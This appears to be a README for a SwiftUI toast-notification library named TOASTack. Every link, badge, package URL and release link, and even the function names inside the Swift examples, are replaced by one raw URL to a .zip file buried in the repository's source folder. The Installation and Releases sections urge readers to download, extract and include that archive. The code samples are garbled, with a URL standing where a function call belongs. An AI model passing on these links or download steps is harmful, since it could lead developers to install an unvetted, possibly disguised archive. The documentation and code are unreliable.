# 🚀 TOASTack: The Simplest Way to Show and Manage Toasts in SwiftUI

![TOASTack Logo](https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip) ![License](https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip) ![Swift Version](https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip)

Welcome to **TOASTack**! This library offers a straightforward approach to display and manage toast notifications in your SwiftUI applications. With TOASTack, you can enhance user experience by providing timely feedback in a non-intrusive manner.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Customization](#customization)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)

## Features

- **Simple API**: Easily show toast messages with minimal code.
- **Customizable**: Tailor the appearance and behavior of toasts to fit your app's design.
- **SwiftUI Ready**: Built specifically for SwiftUI, making it easy to integrate.
- **Multiple Toast Types**: Support for different types of notifications, such as success, error, and info.

## Installation

To install TOASTack, you can use Swift Package Manager. Add the following line to your `https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip` file:

```swift
dependencies: [
    .package(url: "https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip", from: "1.0.0")
]
```

Alternatively, you can download the latest release from the [Releases](https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip) section. If you choose this method, download the file, extract it, and include it in your project.

## Usage

Using TOASTack is simple. Here’s a quick example of how to display a toast message:

```swift
import SwiftUI
import TOASTack

struct ContentView: View {
    var body: some View {
        Button("Show Toast") {
            https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("This is a toast message!")
        }
    }
}
```

This code will display a toast message when the button is pressed. You can call `https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip()` with a string to show a basic toast.

## Customization

TOASTack allows you to customize your toasts easily. You can change the duration, position, and style. Here’s an example:

```swift
https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("This is a custom toast!", duration: 2.0, position: .top, style: .success)
```

You can define your own styles by creating a new `ToastStyle`:

```swift
struct CustomToastStyle: ToastStyle {
    var backgroundColor: Color = .blue
    var textColor: Color = .white
    var cornerRadius: CGFloat = 10.0
}
```

Then, use it like this:

```swift
https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("This is a custom styled toast!", style: CustomToastStyle())
```

## Examples

### Basic Toast

```swift
https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("Hello, World!")
```

### Success Toast

```swift
https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("Operation successful!", style: .success)
```

### Error Toast

```swift
https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("An error occurred!", style: .error)
```

### Custom Duration

```swift
https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("This will disappear in 5 seconds.", duration: 5.0)
```

### Custom Position

```swift
https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("I'm at the bottom!", position: .bottom)
```

## Contributing

We welcome contributions to TOASTack! If you want to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch and create a pull request.

Please ensure that your code follows the style guidelines and includes appropriate tests.

## License

TOASTack is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Releases

For the latest version of TOASTack, visit the [Releases](https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip) section. Here, you can download the latest files and view the change logs.

---

With TOASTack, you can create a better user experience by integrating toasts into your SwiftUI applications effortlessly. Happy coding!